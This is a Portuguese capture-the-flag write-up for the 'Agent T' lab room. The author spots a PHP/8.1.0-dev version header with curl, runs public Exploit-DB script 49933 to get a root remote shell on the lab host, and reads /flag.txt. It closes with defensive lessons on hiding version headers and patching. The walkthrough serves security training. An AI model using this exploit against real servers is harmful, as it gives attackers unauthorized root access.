# Agent T
## Apresentações
Hello, Hackers!

Essa é uma sala com o intuito único: Aprender. Nessa interação lidei com uma RCE (Remote Code Execution), Uma das vulnerabilidades mais cobiçadas e temidas. 

A intro dessa sala nós diz para ficar atentos aos cabeçalhos http.

## Recon sem enrolação
Nessa interação recebemos o ip "10.201.13.38".

Já abri o ip no navegador e notei que se tratava de um painel administrativo. Mas não vamos gastar energia aqui. Vamos ao Ver por trás da solicitações.

```BASH
curl --help
Usage: curl [options...] <url>
 -d, --data <data>           HTTP POST data
 -f, --fail                  Fail fast with no output on HTTP errors
 -h, --help <subject>        Get help for commands
 -o, --output <file>         Write to file instead of stdout
 -O, --remote-name           Write output to file named as remote file
 -i, --show-headers          Show response headers in output
 -s, --silent                Silent mode
 -T, --upload-file <file>    Transfer local FILE to destination
 -u, --user <user:password>  Server user and password
 -A, --user-agent <name>     Send User-Agent <name> to server
 -v, --verbose               Make the operation more talkative
 -V, --version               Show version number and quit
```
Vamos usar as flags "--vv" para ver em detalhes; "-A" para editar nosso user agent (oque é muito legal); e vamos passar a url.

```BASH
IP=
curl -A "HACKER" -vv IP
[...]
 X-Powered-By: PHP/8.1.0-dev
[...]
```
Primeiro declarei o IP para não ficar digitando todas as vezes.

Todos os cabeçalhos HTTP que começam com "X-", tendem a ser um cabeçalho customizado. Nesse caso é uma má prática deixar o web server vazando as tecnólogias internas.

## Acesso Inicial
Já sabemos que o servidor roda internamente um php 8.1.0; Depois de uma simple pesquisa por **Exploit php 8.1**, eu encontrei o Exploit:

[Exploit](https://www.exploit-db.com/exploits/49933)  usado.

O exploit é simples de interpretar devido a liguagem python de alto nivel. Ele envia uma solicitação e se "response = (200 OK)" e vulnerável. 
```BASH
python3 49933.py
Enter the full host url:
https://$IP
Interactive shell is opened on http://10.201.13.38 
Can't acces tty; job crontol turned off.
$ ls
404.html
blank.html
css
gulpfile.js
img
index.php
js
package-lock.json
package.json
scss
vendor
```
##  Objetivos 
Observe que já somos usuário root, mas por ser uma RCE simples não podemos sair do diretorio. Observe minha tentativa:

```BASH
$ whoami
root
$ ls
404.html
blank.html
css
gulpfile.js
img
index.php
js
package-lock.json
package.json
scss
vendor

$ cd /
ls
$ 
404.html
blank.html
css
[...]
vendor
```

Mas ainda assim podemos ler arquivos fora do diretório que estamos.
```
$ ls /root

$ ls /
bin
boot
dev
etc
flag.txt
home
[...]
var

$ cat /flag.txt
[...]
$ 
```
## Aprendizados
Nunca deixe seu servidor expondo dados do funcionamento internos;

Procure por Exploits recentes para encontrar possiveis meios de entradas no seu web server. Atualize sempre que possivel.

Ferramentas: Curl e exploit.

Soft e Hard Skill (respectivamente): Habilidades Analíticas e Pensamenro Lógico.
# Hack The World!
